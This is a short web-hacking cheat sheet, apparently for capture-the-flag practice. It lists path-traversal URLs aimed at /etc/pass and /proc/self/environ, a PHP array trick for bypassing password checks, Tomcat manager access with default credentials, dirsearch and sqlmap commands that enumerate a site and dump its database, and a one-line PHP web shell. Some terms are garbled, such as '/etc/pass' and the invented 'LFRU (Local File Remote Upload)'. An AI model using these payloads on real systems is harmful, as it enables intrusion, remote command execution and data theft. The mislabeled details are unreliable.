# Tips and Tricks for Web

## Robots
Sometimes you gotta check out for `/robots.txt`
## PHP []
When Submit was pressed, a POST request was sent to the server containing:  
```
password=yourinput
```
We break the application by passing an array as the password.  
```
password[]=
```

## Web Upload

If we have a LFRU (Local File Remote Upload) we use:
`http://website.com:port/files/../../../../etc/pass`.
If that doesnt work we then use
`http://website.com:port/files/..%2F..%2F..%2F..%2Fetc%2Fpass`
for LFI.

If `etc/pass` is useless we use then `/proc/self/environ` by `http://website.com:port/files/..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron`
Add more %2F inbetween if needed.

## Tomcat Manager
Apache Tomcat has a `manager`, so inorder to access him we place this at the end of the url `/manager/html`.  
If luck still isnt on our side, we add tomcat default credentials too at the begining of the url, such as: `http://tomcat:tomcat@host:proxy/manager/html`


## dirsearch

python3 dirsearch.py -u host --proxy=http://host:port/ -e sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar

## SQL Map
### SQL Injection
If we have a input box vulnerable to `SQL Injection`, we can execute this command through a `POST` request:  
`sqlmap.py -r post.txt -p id --dump`  
In the post file we will have the `POST` request, we can get it from `Google Developer tools` or `Burp`  
(post.txt)
```sh
POST /index.php HTTP/1.1
Host: host
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://host/index.php
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
 
id=a&submit1=submit
```

## Image Valun
<?php system($_GET['cmd']); die(); ?>
